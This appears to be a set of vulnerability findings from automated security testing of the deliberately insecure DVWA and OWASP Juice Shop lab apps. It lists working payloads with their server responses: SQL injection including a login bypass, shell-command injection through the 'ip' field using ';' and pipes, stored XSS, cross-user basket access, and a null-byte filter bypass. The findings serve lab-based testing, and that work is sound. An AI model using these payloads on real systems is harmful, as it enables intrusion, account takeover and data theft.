findings.title: SQL Injection via unsanitized 'id' parameter in DVWA SQLi page (security=low)
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 user records bypassing the single-record WHERE clause: 'ID: 1' OR '1'='1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id=1' AND '1'='2 returned zero records (page showed only the static 'User ID:' prompt with no pre_blocks/result rows). This confirms the id parameter is concatenated unsanitized into the SQL query, enabling boolean-based SQL injection.

findings.title: OS Command Injection via 'ip' field in DVWA Command Injection page (security=low)
findings.response_evidence: [security=low] Payload ip=127.0.0.1; whoami was submitted to the ping form. Response pre_block contained the expected ping output PLUS an appended line 'www-data' at the end of the output: \"PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. ... rtt min/avg/max/mdev = 0.024/0.031/0.041/0.006 ms\\nwww-data\". The presence of 'www-data' (the web server process identity, output of the injected whoami command chained via ';') confirms the ip field is passed unsanitized to a shell command, enabling OS command injection.

findings.title: Stored Cross-Site Scripting via 'mtxMessage' field in DVWA Guestbook (security=low)
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'tester', mtxMessage: '<script id="test_token">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'}
findings.response_evidence: [security=low] The 50-character canary payload <script id=\"test_token\">window.xss_flag=1</script> was accepted by mtxMessage (maxlength=50, exact fit) and stored; subsequent GET of the guestbook page showed a new entry 'Name: tester' with the script content not HTML-escaped (rendered as executable markup rather than literal text, consistent with stored unsanitized injection).
findings.browser_js_evidence: browser_eval_js("window.xss_flag") returned result=1, confirming the injected <script> tag executed in the DOM. browser_read_dom("#test_token") returned inner_text/inner_html_excerpt = "window.xss_flag=1", confirming the injected script element with id=test_token was rendered and present in the live DOM of the authenticated admin session, proving stored XSS execution.

findings.title: OS Command Injection via pipe bypass in 'ip' field (DVWA medium security)
request_sequence: GET http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) -> confirmed security_level=medium in session_info and page form (ip text + Submit)
findings.response_evidence: [security=medium] Payload used: ip=127.0.0.1| whoami (pipe injection bypassing the medium blacklist of ';' and '&&'). Response visible_text contained: 'Enter an IP address: www-data' and pre_blocks returned exactly ["www-data"], confirming execution of the injected `whoami` command returned the web server process identity 'www-data'. session_info confirmed security_level=medium at time of request.

findings.title: SQL Injection via numeric boolean bypass in 'id' POST field (DVWA medium security)
request_sequence: GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) -> confirmed security_level=medium, id now rendered as <select> dropdown but underlying POST field name 'id' still accepted raw injected value
POST http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) form_data={id: '1 OR 1=1', Submit: 'Submit'}  [TRUE condition]
POST http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) form_data={id: '1 AND 1=2', Submit: 'Submit'}  [FALSE condition]
findings.response_evidence: [security=medium] TRUE payload id=1 OR 1=1 returned 5 seeded user records (multiple rows) with surnames: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (pre_blocks list confirms 5 distinct ID/First name/Surname entries). FALSE payload id=1 AND 1=2 returned zero records — response visible_text/pre_blocks contained no 'ID:' result rows at all, only the empty form. This TRUE-returns-multiple-rows vs FALSE-returns-zero-rows behavioral difference, using numeric (unquoted) boolean payloads required because quotes are escaped server-side at medium, confirms exploitable SQL injection in the 'id' POST parameter at security_level=medium.

findings.title: SQL Injection via out-of-band session-input id parameter (DVWA high security)
findings.response_evidence:
[security=high] Page confirms 'Security Level: high'. 

TRUE payload id=1' OR '1'='1' # submitted via session-input.php, then GET /vulnerabilities/sqli/ returned 5 seeded records bypassing the LIMIT 1 clause via UNION-free boolean OR (the trailing ' #' comments out the appended LIMIT 1 clause allowing all rows to surface through repeated single-row iteration/display logic):
  ID: 1' OR '1'='1' # | First name: admin   | Surname: admin
  ID: 1' OR '1'='1' # | First name: Gordon  | Surname: Brown
  ID: 1' OR '1'='1' # | First name: Hack    | Surname: Me
  ID: 1' OR '1'='1' # | First name: Pablo   | Surname: Picasso
  ID: 1' OR '1'='1' # | First name: Bob     | Surname: Smith

FALSE payload id=1' AND '1'='2' # submitted via session-input.php, then GET /vulnerabilities/sqli/ returned ZERO records (no pre_blocks, visible_text only shows the static page chrome with no First name/Surname entries), confirming the boolean-based differential behavior required for SQLi verification at high security.

findings.title: OS Command Injection via ip parameter using no-space pipe bypass (DVWA high security)
findings.response_evidence: [security=high] Page confirms 'Security Level: high'. Payload ip=127.0.0.1|whoami (pipe with NO trailing space, bypassing the high-security blacklist which blocks '; ', '| ' with trailing space, and '&&') was submitted. Response pre_blocks contain exactly: "www-data" — the web server process identity — proving successful command injection and execution of the chained whoami command on the host.

findings.title: Cross-User Basket Access (BOLA) via /rest/basket/{id} — no ownership check
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct1) -> 200, returns acct1's own basket: id=6, UserId=22, Products=[Apple Juice (1000ml) qty=3]

GET http://juiceshop:3000/rest/basket/1 (session=juiceshop_acct2, acct2's own_basket_id=7) -> 200, returns basket id=1, UserId=1 (NOT acct2's account), Products=[Apple Juice (1000ml) qty=2, Orange Juice (1000ml) qty=3, Eggfruit Juice (500ml) qty=1]
findings.response_evidence: juiceshop_acct2 (own_basket_id=7, email=acct2_bench@juiceshop.local) successfully retrieved basket ID 1, which belongs to UserId=1 (not acct2's own user). The response disclosed the full distinct seeded basket contents belonging to a different account: Apple Juice (1000ml) qty=2, Orange Juice (1000ml) qty=3, Eggfruit Juice (500ml) qty=1 — none of which match acct2's own seeded basket (id=7). This confirms the /rest/basket/{id} endpoint performs no server-side ownership/authorization check, allowing any authenticated user to read any other user's basket contents by ID (IDOR/BOLA).

findings.title: Confidential acquisitions memo exposed via open /ftp/ directory listing
request_sequence: GET http://juiceshop:3000/ftp/ (session=unauth, Accept: text/html,application/json) -> 200, directory listing including link 'acquisitions.md' (909 bytes)
GET http://juiceshop:3000/ftp/acquisitions.md (session=unauth) -> 200, returns confidential memo text
findings.response_evidence:
Unauthenticated GET to /ftp/ returned HTTP 200 with a browsable directory index (serve-index style) listing acquisitions.md (909 bytes) alongside other sensitive files. Direct unauthenticated GET to /ftp/acquisitions.md returned HTTP 200 with content-type text/markdown and body: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...' — confirming an internal confidential document is exposed to anonymous users via open directory listing with no access control.

findings.title: Authentication Bypass via SQL Injection in login email field
findings.response_evidence: Submitting email=\"' OR 1=1--\" with an arbitrary password to POST /rest/user/login returned HTTP 200 with a successful authentication payload: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The response's umail field confirms the backend SQL query (SELECT * FROM Users WHERE email='<input>' AND password=[REDACTED] was manipulated by the injected OR 1=1-- clause to bypass the WHERE condition entirely, returning the first user in the table (admin@juice-sh.op) along with a valid issued JWT auth token and basket id (bid:1), without knowledge of the admin's real password. This is a confirmed SQL injection authentication bypass.

findings.title: Product Search SQL Injection (error-based + UNION)
findings.response_evidence: Request 1 (q=qwert') returned HTTP 500 with body: 'Error: SQLITE_ERROR: near \"'%'\": syntax error' — confirming the raw quote character broke the backend SQL query and is reflected unsanitized into a LIKE clause. Request 2 (q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--) returned HTTP 200 with JSON: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} — demonstrating a successful 9-column UNION SELECT injection that closed the original query/subquery parentheses and appended a comment, returning attacker-controlled literal values (2,3,4,...,9) mapped directly into the product JSON fields. This confirms classic UNION-based SQL injection in the product search endpoint.

findings.title: Unauthenticated Feedback Endpoint Discloses PII (user emails)
findings.response_evidence: Unauthenticated GET /api/Feedbacks returned HTTP 200 with a JSON array of 8 feedback records with no authentication required. Several records embed user email fragments associated with UserId values, e.g. UserId 1 comment '... (***in@juice-sh.op)', UserId 2 '... (***@juice-sh.op)', UserId 3 '... (***der@juice-sh.op)', UserId 21 '... (***ereum@juice-sh.op)'. Even though partially masked in the comment text, these are real author email address fragments tied to specific UserIds disclosed without any authentication — confirming unauthenticated PII exposure via this endpoint (full email addresses are recoverable/correlatable via the exposed UserId and partial domain/suffix matching known seeded accounts).

findings.title: Poison Null-Byte Path Traversal / Extension Filter Bypass under /ftp/
findings.response_evidence: Request 1: GET /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' thrown from fileServer.js verify() middleware, proving the .bak extension is blocklisted for direct access. Request 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte + allowed .md extension appended) returned HTTP 200 with content-type application/octet-stream and the full contents of the restricted package.json file, e.g. '{\"name\": \"juice-shop\", \"version\": \"6.2.0-SNAPSHOT\", \"description\": \"An intentionally insecure JavaScript Web Application\", ...}' including dependencies, devDependencies, repository info, etc. This confirms the extension-check filter is bypassed via a poison null byte, allowing retrieval of the restricted .bak backup file content despite the apparent .md extension.

findings.title: Exposed Encryption Keys Directory Listing
findings.response_evidence: GET /encryptionkeys/ returned HTTP 200 with a browsable serve-index directory listing (visible_text: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM') and extracted links to http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key. This confirms the directory is browsable without authentication and exposes sensitive key material filenames (jwt.pub, premium.key) that should not be publicly listed.
